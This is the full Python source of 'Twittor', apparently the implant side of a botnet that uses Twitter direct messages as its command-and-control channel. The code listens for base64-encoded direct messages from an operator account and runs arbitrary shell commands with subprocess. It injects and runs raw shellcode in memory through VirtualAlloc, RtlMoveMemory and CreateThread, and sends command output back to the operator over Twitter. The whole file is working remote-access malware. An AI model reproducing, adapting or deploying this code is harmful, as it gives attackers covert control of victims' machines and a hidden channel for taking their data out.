from tweepy import Stream
from tweepy import OAuthHandler
from tweepy import API
from tweepy.streaming import StreamListener
from uuid import getnode as get_mac
import ctypes
import json
import threading
import subprocess
import base64
import platform


api = None

# These values are appropriately filled in the code
CONSUMER_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
CONSUMER_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

ACCESS_TOKEN = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
ACCESS_TOKEN_SECRET = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'

USERNAME = 'XXXXXXXXXXXXXXXXXXXXXXXX'
MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))

#
# Exception for Twittor
#


class TwittorException(Exception):
    """
        Base exception
    """

    def __init__(self, message, errors):
        Exception.__init__(self, message)
        self.errors = errors

#
# Decoding exception when decoding a message
#


class DecodingException(TwittorException):
    """
        Exception when trying to decode a CommandOutput
    """

#
# Class to parse received Command
#


class CommandToExecute:

    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            raise DecodingException('Error decoding message: %s' % message)

    def is_for_me(self):
        global MAC_ADDRESS
        return MAC_ADDRESS == self.receiver or self.cmd == 'PING' and 'output' not in self.data

    def retrieve_command(self):
        return self.jobid, self.cmd

#
# Class to build Command to send
#


class CommandOutput:

    def __init__(self, sender, receiver, output, jobid, cmd):
        self.sender = sender
        self.receiver = receiver
        self.output = output
        self.cmd = cmd
        self.jobid = jobid

    def build(self):
        cmd = {'sender': self.sender,
                'receiver': self.receiver,
                'output': self.output,
                'cmd': self.cmd,
                'jobid': self.jobid}
        return base64.b64encode(json.dumps(cmd))

#
# Execute shellcode on a separate thread
#


class ExecuteShellcode(threading.Thread):

    def __init__(self, jobid, shellc):
        threading.Thread.__init__(self)
        self.shellc = shellc
        self.jobid = jobid

        self.daemon = True
        self.start()

    def run(self):
        try:
            shellcode = bytearray(self.shellc)

            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                ctypes.c_int(len(shellcode)),
                ctypes.c_int(0x3000),
                ctypes.c_int(0x40))

            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.c_int(ptr),
                ctypes.c_int(0),
                ctypes.c_int(0),
                ctypes.pointer(ctypes.c_int(0)))

            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

        except Exception as e:
            print e
            pass

#
# Execute Command on a separate thread
#


class ExecuteCommand(threading.Thread):

    def __init__(self, jobid, cmd):
        threading.Thread.__init__(self)
        self.jobid = jobid
        self.command = cmd

        self.daemon = True
        self.start()

    def run(self):
        if (self.command == 'PING'):
            output = platform.platform()
        else:
            output = subprocess.check_output(self.command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
        output_command = CommandOutput(MAC_ADDRESS, 'master', output, self.jobid, self.command)
        api.send_direct_message(user=USERNAME, text=output_command.build())

#
# Listener to stream Twitter messages and intercept Direct Messages
#


class StdOutListener(StreamListener):

    def on_data(self, status):
        try:
            data = json.loads(status)
            if data['direct_message'] and data['direct_message']['sender_screen_name'] == USERNAME:
                try:
                    cmd = CommandToExecute(data['direct_message']['text'])
                    if (cmd.is_for_me()):
                        jobid, cmd = cmd.retrieve_command()
                        print 'jobid: %s, cmd to execute: %s' % (jobid, cmd)
                        if (cmd.split(' ')[0] == 'shellcode'):
                            sc = base64.b64decode(cmd.split(' ')[1]).decode('string-escape')
                            ExecuteShellcode(jobid, sc)
                        else:
                            ExecuteCommand(jobid, cmd)
                except:
                    pass
        except:
            print 'Did not manage to decode %s' % status
        return True


def main():
    global api

    try:
        auth = OAuthHandler(CONSUMER_TOKEN, CONSUMER_SECRET)
        auth.secure = True
        auth.set_access_token(ACCESS_TOKEN, ACCESS_TOKEN_SECRET)

        api = API(auth)
        stream = Stream(auth, StdOutListener())
        stream.userstream()

    except BaseException as e:
        print("Error in main()", e)

if __name__ == '__main__':
    main()
